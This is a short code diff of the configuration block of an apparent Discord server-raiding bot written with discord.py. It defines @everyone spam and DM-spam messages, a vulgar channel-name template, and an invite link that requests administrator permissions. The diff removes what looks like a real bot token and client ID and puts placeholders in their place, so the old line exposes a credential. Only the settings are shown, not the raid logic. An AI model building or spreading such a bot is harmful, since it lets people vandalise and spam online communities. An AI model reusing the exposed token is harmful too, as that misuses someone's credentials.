@@ -3,13 +3,13 @@ import asyncio
 import time
 from discord.ext import commands
 
-TOKEN = "MTA2NzkyNTQ5Njk3OTAwOTY3Nw.GnWbbY.dcRMFxsf6T5ndZaXzIIK0s9_mkWkLHc5V_3Qd4"
+TOKEN = "HYYFHGy7hHTG6GTagtTG6tK7Y77Yhhy7Y76uy7hY7"
 PREFIX = "!"
 DM_MESSAGE = "wowee, a dm :D"
 SPAM_MESSAGE = "the message it sends when it creates the channel, @everyone is already provided"
 CHANNEL_NAME = "FUCKED BY *your name here*"
 ROLE_NAME = ":D"
-BOT_INVITE = "https://discord.com/api/oauth2/authorize?client_id=1067925496979009677&permissions=8&scope=bot"
+BOT_INVITE = "https://discord.com/api/oauth2/authorize?client_id=5887786857456748766735627&permissions=8&scope=bot"
 
 
 client = commands.Bot(command_prefix=PREFIX,intents=discord.Intents.all())
